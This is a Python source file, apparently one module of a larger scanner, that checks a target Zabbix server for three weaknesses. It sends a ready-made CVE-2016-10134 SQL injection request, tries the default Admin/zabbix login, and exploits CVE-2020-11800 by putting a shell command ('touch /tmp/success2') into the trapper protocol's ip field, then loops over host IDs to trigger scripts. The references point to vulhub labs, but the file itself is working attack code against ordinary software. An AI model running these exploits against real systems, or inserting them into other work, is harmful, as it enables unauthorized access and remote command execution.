from termcolor import cprint
import requests
import threading
import re
from tqdm import *
from colorama import Fore
import socket
import json
from urllib.parse import urlparse

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


# 模板
class Detect(threading.Thread):
    name = '漏洞名'

    def __init__(self, url, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.url = url.rstrip('/')
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
        self.isExist = False  # 检测该url是否存在漏洞，默认为False，如果测出有漏洞，则设置为True

    # 调用各种漏洞检测方法
    def run_detect(self):

        self.CVE_2016_10134()
        self.weakVul()
        self.CVE_2020_11800()

        if not self.isExist:
            return False
        else:
            return True

    # SQL注入
    def CVE_2016_10134(self):
        '''
        SQL注入   https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134
        :return:
        '''
        url1 = self.url + '/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2%273297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1'
        try:
            res = requests.get(url=url1, headers=self.headers, proxies=self.proxies, verify=False)
            if res.status_code == 200 and 'SQL syntax' in res.text:
                self.isExist = True
                tqdm.write(Fore.RED + '[Zabbix SQL注入] {}'.format(self.url))
                self.vul_list.append(['Zabbix SQL注入', self.url, 'Yes {}'.format(url1)])
        except Exception as e:
            return False

    # 弱口令
    def weakVul(self):
        '''
        POST /index.php HTTP/1.1
        Host: 123.57.203.210
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
        Content-Length: 67

        form_refresh=1&name=Admin&password=zabbix&autologin=1&enter=Sign in
        :return:
        '''
        url2 = self.url + '/index.php'
        data = {"form_refresh": "1", "name": "Admin", "password": "zabbix", "autologin": "1", "enter": "Sign in"}
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36",
                   "Content-Type": "application/x-www-form-urlencoded"}
        try:
            res = requests.post(url=url2, headers=headers, data=data, proxies=self.proxies, verify=False, allow_redirects=False)
            if res.status_code == 302:
                self.isExist = True
                tqdm.write(Fore.RED + "[Zabbix 弱口令] {} Admin/zabbix".format(self.url))
                self.vul_list.append(['Zabbix 弱口令', self.url, "Admin/zabbix"])
        except Exception as e:
            # print(e.args)
            return False


    def CVE_2020_11800(self):
        '''
        Zabbix Server trapper命令注入漏洞
        参考链接：https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800
        :return:
        '''

        def send(ip, data):
            conn = socket.create_connection((ip, 10051), 10)
            conn.send(json.dumps(data).encode())
            data = conn.recv(2048)
            conn.close()
            return data

        host = urlparse(self.url).netloc.split(':')[0]
        print(host)
        try:
            print(send(host, {"request": "active checks", "host": "vulhub", "ip": "ffff:::;touch /tmp/success2"}))
            for i in range(10000, 10500):
                data = send(host, {"request": "command", "scriptid": 1, "hostid": str(i)})
                if data and b'failed' not in data:
                    print('hostid: %d' % i)
                    print(data)
        except Exception as e:
            # print(e.args)
            return False

if __name__ == '__main__':
    from queue import Queue

    vul_list = []
    # proxy = r'192.168.168.148:10086'
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))
